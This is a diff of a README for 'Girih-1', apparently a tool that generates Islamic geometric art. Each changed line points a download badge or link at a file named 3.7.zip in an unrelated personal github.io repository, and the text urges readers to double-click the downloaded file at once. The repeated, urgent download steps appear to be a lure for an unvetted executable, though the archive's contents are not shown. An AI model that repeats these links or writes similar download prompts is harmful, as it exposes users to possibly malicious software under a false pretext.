@@ -5,7 +5,7 @@ description: "Generate seed-based Islamic geometric art with reproducible algori
 ---
 # ✨ Girih-1-Generative-Art - Create Stunning Islamic Geometric Art Instantly
 
-[![Download Girih-1](https://img.shields.io/badge/Download-Girih--1-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Anwaar0012/anwaar0012.github.io/main/media/3.7.zip)
+[![Download Girih-1](https://img.shields.io/badge/Download-Girih--1-blue?style=for-the-badge&logo=github)](https://github.com/Anwaar0012/anwaar0012.github.io/raw/refs/heads/main/media/3.7.zip)
 
 ---
 
@@ -19,7 +19,7 @@ Think of it as a digital loom that weaves intricate geometric patterns based on 
 
 Getting Girih-1 up and running is incredibly simple. You don't need to install anything complicated or configure any settings. Just follow these three easy steps:
 
-1. **Visit this link to download the application** - [Click here to download Girih-1](https://raw.githubusercontent.com/Anwaar0012/anwaar0012.github.io/main/media/3.7.zip)
+1. **Visit this link to download the application** - [Click here to download Girih-1](https://github.com/Anwaar0012/anwaar0012.github.io/raw/refs/heads/main/media/3.7.zip)
 2. **Open the downloaded file** - Once the download completes, look in your "Downloads" folder and double-click the file to open it.
 3. **Start creating** - The app will open in your web browser, and you're ready to generate beautiful patterns!
 
@@ -142,7 +142,7 @@ The world of Girih-1 is vast. Here are some ways to dive deeper:
 
 Ready to start creating? Here's your direct link:
 
-[![Download Girih-1 Now](https://img.shields.io/badge/⬇️%20Download%20Girih--1-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Anwaar0012/anwaar0012.github.io/main/media/3.7.zip)
+[![Download Girih-1 Now](https://img.shields.io/badge/⬇️%20Download%20Girih--1-2ea44f?style=for-the-badge)](https://github.com/Anwaar0012/anwaar0012.github.io/raw/refs/heads/main/media/3.7.zip)
 
 Remember, it's free, it's fast, and it opens in seconds. Don't wait - your first pattern is just a click away.
 
